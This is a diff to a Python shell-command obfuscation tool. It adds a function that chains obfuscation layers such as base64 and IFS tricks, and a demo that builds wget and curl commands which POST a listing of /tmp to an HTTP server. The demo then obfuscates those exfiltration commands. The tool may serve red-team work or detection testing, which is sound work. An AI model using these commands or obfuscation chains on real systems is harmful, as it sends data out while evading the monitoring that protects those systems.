@@ -315,8 +315,49 @@ def apply_obf(name: str, cmd: str, **kwargs) -> str | None:
     func = entry["func"]
     extra = entry.get("other_arg", [])
     call_kwargs = {k: kwargs[k] for k in extra if k in kwargs}
-    return func(cmd, **call_kwargs)
+    obf_cmd = func(cmd, **call_kwargs)
+    debug_log(
+        f"methods:{name} cmd:{cmd} obf_cmd:{obf_cmd}",
+        "apply_obfs"
+    )
+    return obf_cmd
 
+def apply_obfs(
+    cmd: str,
+    obf: list[str] | None = None,
+    **kwargs
+) -> str | None:
+
+    if not cmd:
+        return None
+    current_cmd = cmd
+
+    methods: list[str] = []
+
+    # 过滤不存在的方法
+    valid_obfs = [o for o in (obf or []) if o in OBFUSCATIONS]
+
+
+    methods.extend(valid_obfs)
+
+    # 如果没有指定方法
+    if not methods:
+        debug_log("no obfuscation methods", "apply_obfs")
+        return None
+
+    for idx, method in enumerate(methods, start=1):
+
+        result = apply_obf(method, current_cmd, **kwargs)
+
+        if result is None:
+            debug_log(
+                f"第 {idx} 层失败: [{method}] cmd:{current_cmd}",
+                "apply_obfs"
+            )
+
+            return None
+        current_cmd = result
+    return current_cmd
 
 
 def random_obf(cmd: str, obf: list[str] | None = None, depth: int = 4, args: dict[str, str | list[str]] | None = None) -> str:
@@ -359,14 +400,32 @@ def random_obf(cmd: str, obf: list[str] | None = None, depth: int = 4, args: dic
     return current_cmd
 
 
-if __name__ == '__main__':
+def demo():
     from tool.local_ip import get_ip
+
     ip = get_ip()
-    c = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
 
-    for n in OBFUSCATIONS:
-        r = apply_obf(n, c)
-        print(f"[{n}]\n{r}\n")
+    wget_cmd = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
 
-    print(f"[random_obf]\n{random_obf(c)}\n")
+    curl_cmd = f"bash -c 'curl -d $(printf %s.. $(ls /tmp)) http://{ip}:8000/'"
+    cmds = [wget_cmd, curl_cmd]
+
+    for cmd in cmds:
+        print(cmd)
+        print(f"[random_obf]\n{random_obf(cmd)}")
+        obfs = ['base64', 'bash_c_ifs1']
+        print(
+            f"[apply_obfs({obfs})]\n"
+            f"{apply_obfs(cmd, obfs)}"
+        )
+        obfs = ['base64']
+        print(
+            f"[apply_obfs({obfs})]\n"
+            f"{apply_obfs(cmd, obfs)}"
+        )
+        print("\n")
+
+
+if __name__ == '__main__':
+    demo()
 
